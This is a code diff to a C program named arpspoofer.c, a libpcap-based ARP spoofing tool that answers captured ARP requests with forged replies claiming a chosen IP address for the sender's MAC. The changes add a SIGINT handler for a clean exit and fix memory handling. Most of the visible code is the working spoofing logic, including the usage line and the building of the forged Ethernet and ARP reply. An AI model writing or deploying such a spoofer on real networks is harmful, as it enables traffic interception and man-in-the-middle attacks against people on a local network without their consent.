@@ -1,7 +1,7 @@
 /* COMPILE WITH gcc arpspoofer.c - o arp-spoof -lpcap */
 /* USAGE: arp-spoof [interface] [IP to be spoofed] */
 
-
+#include <signal.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>           // close()
@@ -55,6 +55,10 @@ struct arp_hdr{
 struct ifreq *populateIfreq();
 struct eth_hdr *setupEthHdr(uint8_t *dest, uint8_t *src);
 struct arp_hdr *setupArpHdr(uint8_t *src_mac, uint8_t *src_ip, uint8_t *dest_mac, uint8_t *dest_ip);
+void sig_handler(int signum);
+
+/* Atomic var that controls the main loop */
+sig_atomic_t volatile g_running = 1;
 
 
 int main(int argc, char *argv[]) {
@@ -79,6 +83,7 @@ int main(int argc, char *argv[]) {
     char *my_mac = malloc(6);         /* Our MAC address to be used in eth_hdr and arp_hdr*/
     char *interface = malloc(40);     /* Interface name, provided by the user */
     char *spoofed_IP = malloc(4);     /* IP to be spoofed, provided by the user */
+    char *msg = malloc(sizeof(struct arp_hdr) + sizeof(struct eth_hdr)); /* Will hold the final message */
 
     uint8_t *spoofed_IP_network = malloc(4); /* IP to be spoofed in network byte order */
 
@@ -138,8 +143,12 @@ int main(int argc, char *argv[]) {
       exit(1);
     }
 
+
+
+    signal(SIGINT, &sig_handler);
+
     /* Main loop */
-    while(1){
+    while(g_running){
 
       int status = pcap_next_ex(descr,&pkthdr, &packet);
 
@@ -168,7 +177,7 @@ int main(int argc, char *argv[]) {
       struct eth_hdr *eth_rsp = setupEthHdr(recv_arp->src_mac,my_mac);
       struct arp_hdr *arp_rsp = setupArpHdr(my_mac,spoofed_IP_network,recv_arp->src_mac, recv_arp->src_ip);
 
-      char *msg = malloc(sizeof(struct arp_hdr) + sizeof(struct eth_hdr));
+      /* Paste them together into our final message */
       memcpy(msg,eth_rsp,sizeof(struct eth_hdr));
       memcpy(msg + sizeof(struct eth_hdr), arp_rsp, sizeof(struct arp_hdr));
 
@@ -184,18 +193,27 @@ int main(int argc, char *argv[]) {
         perror ("sendto() failed");
         exit (EXIT_FAILURE);
       }
-
-
-      free(msg);
       free(eth_rsp);
       free(arp_rsp);
 
-
     }
 
+
+  free(my_mac);
+  free(interface);
+  free(spoofed_IP);
+  free(spoofed_IP_network);
+  free(msg);
+  free(ifr);
   return(0);
 }
 
+/* Sets the shared variable to 0, ending the loop */
+void sig_handler(int signum)
+{
+  if (signum == SIGINT)
+    g_running = 0;
+}
 
 /* Returns a filled out arp_hdr (ARP reply to be specific) with the given addresses in network byte order*/
 struct arp_hdr *setupArpHdr(uint8_t *src_mac, uint8_t *src_ip, uint8_t *dest_mac, uint8_t *dest_ip)
